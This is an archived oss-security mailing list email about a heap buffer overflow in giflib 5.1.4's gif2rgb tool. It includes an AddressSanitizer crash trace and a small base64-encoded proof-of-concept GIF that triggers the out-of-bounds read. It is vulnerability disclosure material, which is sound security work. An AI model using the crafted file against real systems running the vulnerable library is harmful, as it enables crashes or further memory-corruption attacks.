X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3791" "Tuesday" "13" "September" "2016" "18:50:06" "+0200" "Solar Designer" "solar@openwall.com" "<20160913165006.GA9055@openwall.com>" "97" "Re: [oss-security] Heapoverflow in giflib5.1.4" "^Cc:" nil nil "9" "2016091316:50:06" "[oss-security] Heapoverflow in giflib5.1.4" (number mark "        solar@openwa Sep 13   97/3791  " thread-indent "\"Re: [oss-security] Heapoverflow in giflib5.1.4\"\n") "<a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>" ("<a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 5462 invoked by uid 550); 13 Sep 2016 17:08:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 18291 invoked from network); 13 Sep 2016 16:50:13 -0000
Message-ID: <20160913165006.GA9055@openwall.com>
References: <a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="gKMricLos+KVdGMg"
Content-Disposition: inline
In-Reply-To: <a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>
User-Agent: Mutt/1.4.2.3i
Cc: oss-security@lists.openwall.com
Date: Tue, 13 Sep 2016 18:50:06 +0200
From: Solar Designer <solar@openwall.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Heapoverflow in giflib5.1.4
To: "vul @ 724safe" <vul@724safe.com>

--gKMricLos+KVdGMg
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Tue, Sep 13, 2016 at 11:20:08PM +0800, vul @ 724safe wrote:
> With Address Sanitizer there is aa heap overflow in giflib 5.1.4
> More details are available at:
> https://sourceforge.net/p/giflib/bugs/102/

When posting to oss-security, please include the actual detail right in
your posting (up to 200 KB including MIME overhead, but of course try to
keep it smaller than that if at all practical) - not only via external
links.  I've attached the content of the above link now.  Luckily, this
one PoC GIF file is tiny:

$ base64 poc
R0lGODdhKP9/AADZACwAHQAAKAAAAPngp5Lb5QAD4wAAAgAAOwAd

Ideally, you would also investigate and patch issues found by ASan,
rather than merely include its output, but I realize we can't actually
expect anything specific from volunteers.  So whatever we've got.

Thanks,

Alexander

--gKMricLos+KVdGMg
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="giflib-102-Heap_overflow_in_gif2rgb.c.txt"

#102 Heap overflow in gif2rgb.c

   Milestone: v1.0_(example)
   Status: open
   Owner: nobody
   Labels: heap overflow (1)
   Priority: 7
   Updated: 2 hours ago
   Created: 2 hours ago
   Creator: STARLAB
   Private: No

   Hello,
   There is a Heap-overflow in giflib 5.1.4. The crash output with asan is as follows:
   ./util/gif2rgb poc
   =================================================================
   ==8885==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf6200a3b at pc 0x80d317d bp 0xffce7d58 sp 0xffce7d50
   READ of size 1 at 0xf6200a3b thread T0
   #0 0x80d317c in DumpScreen2RGB /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:294
   #1 0x80d1736 in GIF2RGB /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:474
   #2 0x80cb9e2 in main /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:525
   #3 0xf74b4af2 (/lib/i386-linux-gnu/libc.so.6+0x19af2)
   #4 0x80ca7f4 in _start (/home/starlab/test-fuzzing/giflib-5.1.4/util/.libs/lt-gif2rgb+0x80ca7f4)

   AddressSanitizer can not describe address in more detail (wild memory access suspected).
   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:294 DumpScreen2RGB
   Shadow bytes around the buggy address:
   0x3ec400f0: fa fa 00 00 fa fa 00 04 fa fa 00 00 fa fa 03 fa
   0x3ec40100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   =>0x3ec40140: fa fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa
   0x3ec40150: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40160: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   0x3ec40190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
   Shadow byte legend (one shadow byte represents 8 application bytes):
   Addressable: 00
   Partially addressable: 01 02 03 04 05 06 07
   Heap left redzone: fa
   Heap right redzone: fb
   Freed heap region: fd
   Stack left redzone: f1
   Stack mid redzone: f2
   Stack right redzone: f3
   Stack partial redzone: f4
   Stack after return: f5
   Stack use after scope: f8
   Global redzone: f9
   Global init order: f6
   Poisoned by user: f7
   ASan internal: fe
   ==8885==ABORTING

   The poc is in the attachment
   The vulnerability is found by F4B3CD@STARLAB

--gKMricLos+KVdGMg
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=poc
Content-Transfer-Encoding: base64

R0lGODdhKP9/AADZACwAHQAAKAAAAPngp5Lb5QAD4wAAAgAAOwAd

--gKMricLos+KVdGMg--
